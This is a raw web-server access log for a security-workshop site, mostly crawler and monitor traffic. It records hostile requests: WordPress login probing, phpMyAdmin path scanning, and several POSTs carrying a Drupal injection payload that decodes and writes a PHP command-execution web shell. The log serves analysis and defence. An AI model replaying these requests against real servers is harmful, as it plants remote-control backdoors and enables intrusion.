www.nspw.org:80 217.131.93.39 - - [01/May/2018:16:11:14 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 217.131.93.39 - - [01/May/2018:16:11:16 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 54.70.40.11 - - [01/May/2018:16:12:08 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
www.nspw.org:80 179.198.70.67 - - [01/May/2018:16:12:44 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 179.198.70.67 - - [01/May/2018:16:12:46 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 54.70.40.11 - - [01/May/2018:16:13:27 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 302 537 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
www.nspw.org:80 192.99.7.203 - - [01/May/2018:16:14:05 -0400] "GET / HTTP/1.1" 302 492 "https://www.facebook.com/lasalleacm/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
www.nspw.org:80 54.70.40.11 - - [01/May/2018:16:14:16 -0400] "GET /papers/2012/docs/p15.pdf HTTP/1.1" 302 521 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
www.nspw.org:80 54.70.40.11 - - [01/May/2018:16:15:27 -0400] "GET /2018 HTTP/1.1" 302 481 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:16:15:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 185.111.75.56 - - [01/May/2018:16:15:52 -0400] "HEAD http://134.117.225.17:80/phpmyadmin/ HTTP/1.1" 302 236 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
www.nspw.org:80 185.111.75.56 - - [01/May/2018:16:15:52 -0400] "HEAD http://134.117.225.39:80/phpmyadmin/ HTTP/1.1" 302 236 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
www.nspw.org:80 185.111.75.56 - - [01/May/2018:16:15:52 -0400] "HEAD http://134.117.225.17:80/PMA/ HTTP/1.1" 302 228 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
www.nspw.org:80 185.111.75.56 - - [01/May/2018:16:15:52 -0400] "HEAD http://134.117.225.39:80/PMA/ HTTP/1.1" 302 228 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
www.nspw.org:80 185.111.75.56 - - [01/May/2018:16:15:52 -0400] "HEAD http://134.117.225.17:80/dbadmin/ HTTP/1.1" 302 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
www.nspw.org:80 185.111.75.56 - - [01/May/2018:16:15:53 -0400] "HEAD http://134.117.225.39:80/dbadmin/ HTTP/1.1" 302 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
www.nspw.org:80 185.111.75.56 - - [01/May/2018:16:15:53 -0400] "HEAD http://134.117.225.17:80/pma/ HTTP/1.1" 302 228 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
www.nspw.org:80 185.111.75.56 - - [01/May/2018:16:15:53 -0400] "HEAD http://134.117.225.39:80/pma/ HTTP/1.1" 302 228 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
www.nspw.org:80 185.111.75.56 - - [01/May/2018:16:15:53 -0400] "HEAD http://134.117.225.17:80/db/ HTTP/1.1" 302 227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
www.nspw.org:80 185.111.75.56 - - [01/May/2018:16:15:53 -0400] "HEAD http://134.117.225.39:80/db/ HTTP/1.1" 302 227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
www.nspw.org:80 54.70.40.11 - - [01/May/2018:16:16:40 -0400] "GET /2017/ HTTP/1.1" 302 483 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
www.nspw.org:80 54.70.40.11 - - [01/May/2018:16:17:45 -0400] "GET /2013/ HTTP/1.1" 302 483 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
www.nspw.org:80 54.36.148.188 - - [01/May/2018:16:17:55 -0400] "GET /2009/queens.jpg HTTP/1.1" 302 503 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 223.218.104.68 - - [01/May/2018:16:18:18 -0400] "GET / HTTP/1.1" 302 525 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
www.nspw.org:80 54.70.40.11 - - [01/May/2018:16:18:59 -0400] "GET /2012/ HTTP/1.1" 302 483 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
www.nspw.org:80 54.70.40.11 - - [01/May/2018:16:20:02 -0400] "GET /2005/ HTTP/1.1" 302 483 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:16:20:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 54.70.40.11 - - [01/May/2018:16:20:40 -0400] "GET / HTTP/1.1" 302 473 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
www.nspw.org:80 54.36.149.60 - - [01/May/2018:16:20:43 -0400] "GET /2016/accepted HTTP/1.1" 302 495 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 77.75.79.32 - - [01/May/2018:16:20:47 -0400] "GET /robots.txt HTTP/1.1" 302 549 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.79.32 - - [01/May/2018:16:20:56 -0400] "GET /2003/pc.content HTTP/1.1" 302 559 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.79.32 - - [01/May/2018:16:20:58 -0400] "GET /2000/oc.html HTTP/1.1" 302 552 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.79.32 - - [01/May/2018:16:20:58 -0400] "GET /papers/2013/ HTTP/1.1" 302 552 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.79.32 - - [01/May/2018:16:20:59 -0400] "GET /2012/dates HTTP/1.1" 302 548 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.79.32 - - [01/May/2018:16:20:59 -0400] "GET /2010/pc HTTP/1.1" 302 542 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 66.249.73.80 - - [01/May/2018:16:22:03 -0400] "GET /current/ HTTP/1.1" 302 545 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 216.244.66.236 - - [01/May/2018:16:22:10 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 172.245.58.248 - - [01/May/2018:16:23:14 -0400] "GET /papers/2007/nspw2007-mannan.pdf HTTP/1.1" 302 591 "http://www.google.com/search?q=cibc+internet+logon&rls=com.microsoft:en-us&ie=UTF-8&oe=UTF-8&startIndex=&startPage=1" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:16:25:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 136.243.17.161 - - [01/May/2018:16:25:37 -0400] "GET /papers/2003/nspw2003-alkassar.pdf HTTP/1.1" 302 595 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
www.nspw.org:80 157.55.39.70 - - [01/May/2018:16:29:44 -0400] "GET /papers/2009/nspw2009-misra.pdf HTTP/1.1" 302 585 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 73.30.153.49 - - [01/May/2018:16:29:47 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 73.30.153.49 - - [01/May/2018:16:29:47 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:16:30:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 199.16.157.183 - - [01/May/2018:16:31:00 -0400] "GET /robots.txt HTTP/1.1" 302 489 "-" "Twitterbot/1.0"
www.nspw.org:80 199.16.157.183 - - [01/May/2018:16:31:01 -0400] "GET /2018/cfp HTTP/1.1" 302 485 "-" "Twitterbot/1.0"
www.nspw.org:80 54.70.40.11 - - [01/May/2018:16:33:51 -0400] "GET /robots.txt HTTP/1.1" 302 489 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
www.nspw.org:80 62.114.159.33 - - [01/May/2018:16:34:04 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 62.114.159.33 - - [01/May/2018:16:34:07 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 199.16.157.181 - - [01/May/2018:16:34:35 -0400] "GET /2018/organizers HTTP/1.1" 302 499 "-" "Twitterbot/1.0"
www.nspw.org:80 54.70.40.11 - - [01/May/2018:16:34:54 -0400] "GET / HTTP/1.1" 302 469 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
www.nspw.org:80 59.124.153.166 - - [01/May/2018:16:35:22 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:16:35:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 107.77.104.34 - - [01/May/2018:16:36:14 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 107.77.104.34 - - [01/May/2018:16:36:14 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 157.55.39.70 - - [01/May/2018:16:37:21 -0400] "GET /papers/1996/nspw1996-serban.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 188.214.146.166 - - [01/May/2018:16:37:24 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 188.214.146.166 - - [01/May/2018:16:37:26 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 82.238.16.31 - - [01/May/2018:16:37:48 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 82.238.16.31 - - [01/May/2018:16:37:49 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 199.59.150.180 - - [01/May/2018:16:40:11 -0400] "GET /2018/cfp HTTP/1.1" 302 485 "-" "Twitterbot/1.0"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:16:40:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 82.67.161.19 - - [01/May/2018:16:40:53 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 82.67.161.19 - - [01/May/2018:16:40:54 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 35.224.113.158 - - [01/May/2018:16:42:46 -0400] "GET /papers/2009/nspw2009-church.pdf HTTP/1.1" 302 535 "-" "Python/3.5 aiohttp/3.1.3"
www.nspw.org:80 54.36.149.83 - - [01/May/2018:16:43:16 -0400] "GET /2010/program HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:16:44:18 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 77.88.47.40 - - [01/May/2018:16:45:17 -0400] "GET /robots.txt HTTP/1.1" 302 549 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
www.nspw.org:80 77.88.47.40 - - [01/May/2018:16:45:21 -0400] "GET /papers/2002/nspw2002-inoue.pdf HTTP/1.1" 302 588 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:16:45:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 216.244.66.236 - - [01/May/2018:16:45:41 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 66.249.69.8 - - [01/May/2018:16:45:43 -0400] "GET /robots.txt HTTP/1.1" 302 560 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.69.10 - - [01/May/2018:16:45:43 -0400] "GET /2017/dates HTTP/1.1" 302 560 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 59.124.153.166 - - [01/May/2018:16:47:03 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 66.249.73.82 - - [01/May/2018:16:47:04 -0400] "GET /current/program.shtml HTTP/1.1" 302 571 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 59.124.153.166 - - [01/May/2018:16:47:12 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:16:50:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:16:55:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 109.131.111.187 - - [01/May/2018:16:58:10 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 109.131.111.187 - - [01/May/2018:16:58:11 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 59.124.153.166 - - [01/May/2018:17:00:03 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:17:00:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 157.55.39.122 - - [01/May/2018:17:04:29 -0400] "GET /papers/2010/nspw2010-bishop.pdf HTTP/1.1" 302 587 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:17:05:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 104.196.53.7 - - [01/May/2018:17:06:16 -0400] "HEAD /papers/2008/nspw2008-mannan.pdf HTTP/1.1" 302 219 "http://www.nspw.org/papers/2008/nspw2008-mannan.pdf" "WordPress/4.9.5; http://everifile.wpengine.com"
www.nspw.org:80 158.129.23.251 - - [01/May/2018:17:06:22 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 158.129.23.251 - - [01/May/2018:17:06:23 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 81.96.83.242 - - [01/May/2018:17:08:31 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 81.96.83.242 - - [01/May/2018:17:08:31 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 216.244.66.236 - - [01/May/2018:17:09:14 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 66.249.73.82 - - [01/May/2018:17:09:25 -0400] "GET /papers/2009/nspw2009-verendel.pdf HTTP/1.1" 302 595 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 78.16.172.26 - - [01/May/2018:17:09:58 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 78.16.172.26 - - [01/May/2018:17:09:59 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:17:10:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 37.173.15.225 - - [01/May/2018:17:15:04 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 37.173.15.225 - - [01/May/2018:17:15:07 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:17:15:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 59.124.153.166 - - [01/May/2018:17:17:27 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:17:18:31 -0400] "GET /2005/cfp/?C=D;O=A HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:17:20:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:17:21:30 -0400] "GET /2005/?C=N;O=A HTTP/1.1" 302 499 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 77.75.78.163 - - [01/May/2018:17:25:18 -0400] "GET /robots.txt HTTP/1.1" 302 549 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.78.163 - - [01/May/2018:17:25:23 -0400] "GET /papers/2012/forms/authors.htm HTTP/1.1" 302 587 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.78.163 - - [01/May/2018:17:25:26 -0400] "GET /2008/NSPWtrans.gif HTTP/1.1" 302 564 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.78.163 - - [01/May/2018:17:25:27 -0400] "GET /2009/NSPWtrans.gif HTTP/1.1" 302 564 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.78.163 - - [01/May/2018:17:25:27 -0400] "GET /2011/submissions HTTP/1.1" 302 560 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.78.163 - - [01/May/2018:17:25:28 -0400] "GET /2003/nspw2.jpg HTTP/1.1" 302 556 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:17:25:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 220.181.108.102 - - [01/May/2018:17:26:22 -0400] "GET /2009/proceedings/2012/docs/p127.pdf HTTP/1.1" 302 543 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4"
www.nspw.org:80 123.125.71.14 - - [01/May/2018:17:26:23 -0400] "GET /2009/proceedings/2012/docs/p127.pdf HTTP/1.1" 302 543 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4"
www.nspw.org:80 220.181.108.84 - - [01/May/2018:17:26:26 -0400] "GET /2009/proceedings/2012/docs/p127.pdf HTTP/1.1" 302 543 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:17:28:56 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 137.112.228.195 - - [01/May/2018:17:29:11 -0400] "GET /papers/2007/nspw2007-mannan.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:17:30:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 154.69.201.74 - - [01/May/2018:17:31:23 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 154.69.201.74 - - [01/May/2018:17:31:25 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 203.133.169.137 - - [01/May/2018:17:32:42 -0400] "GET /robots.txt HTTP/1.1" 302 508 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
